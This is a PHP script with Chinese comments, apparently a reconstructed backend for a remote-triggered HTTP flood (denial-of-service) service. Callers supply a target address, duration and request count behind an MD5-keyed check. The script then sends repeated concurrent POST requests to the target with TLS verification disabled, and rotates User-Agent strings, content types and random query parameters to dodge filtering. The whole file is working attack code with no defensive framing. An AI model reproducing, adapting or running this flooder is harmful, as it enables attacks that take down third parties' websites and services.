<?php

// 定义常量（这里用简单字符串作为示例）
define('ZHFWR', 'your_secret_value');  // $zhfwr 未定义，假定为某个常量或值
define('SB', 'Invalid MD5 hash!');  // sb 未定义，假定为错误信息

// 获取GET请求参数
$addr = $_GET['addr'] ?? '';
$time = $_GET['time'] ?? 0;
$num = $_GET['num'] ?? 1;
$k = $_GET['k'] ?? '';
$md5 = md5($addr . $time . $num . ZHFWR);

if ($k !== $md5) {
    die(SB);
}

echo "biubiubiu";
flush();
ob_flush();

// 创建并发请求函数
function sendConcurrentRequests($urls)
{
    $mh = curl_multi_init();
    $handles = [];

    // 创建并添加curl句柄
    foreach ($urls as $url) {
        $ch = curl_init();
        $headers = [
            'User-Agent: ' . getRandomUserAgent(),
            'Content-Type: ' . getRandomContentType(),
        ];

        $url = addRandomParamsToUrl($url);
        $postData = getRandomPostData();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);

        curl_multi_add_handle($mh, $ch);
        $handles[] = $ch;
    }

    // 执行并发请求
    $running = null;
    do {
        $status = curl_multi_exec($mh, $running);
        if ($status > 0) {
            echo "Curl multi read error: " . curl_multi_strerror($status);
        }
    } while ($running > 0);

    // 获取响应结果
    $responses = [];
    foreach ($handles as $ch) {
        $response = curl_multi_getcontent($ch);
        $responses[] = $response;
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }

    curl_multi_close($mh);

    return $responses;
}

// 获取随机User-Agent
function getRandomUserAgent()
{
    $userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'
    ];
    $randomIndex = array_rand($userAgents);

    return $userAgents[$randomIndex];
}

// 获取随机Content-Type
function getRandomContentType()
{
    $contentTypes = [
        'application/json',
        'application/xml',
        'application/x-www-form-urlencoded',
    ];
    $randomIndex = array_rand($contentTypes);

    return $contentTypes[$randomIndex];
}

// 在URL中添加随机参数
function addRandomParamsToUrl($url)
{
    $randomParams = [
        'param1' => rand(1, 100),
        'param2' => rand(1, 100),
    ];

    $url .= '?' . http_build_query($randomParams);

    return $url;
}

// 获取随机POST数据
function getRandomPostData()
{
    $postData = [
        'data1' => 'value1',
        'data2' => 'value2',
    ];

    return http_build_query($postData);
}

// 创建并发请求的URL数组
$urls = [];
for ($i = 0; $i < $num; $i++) {
    $urls[] = $addr;
}

// 持续发送并发请求
$startTime = time();
while (time() - $startTime < $time) {
    // 发送并发请求
    $responses = sendConcurrentRequests($urls);
}

echo "请求完成！";

?>
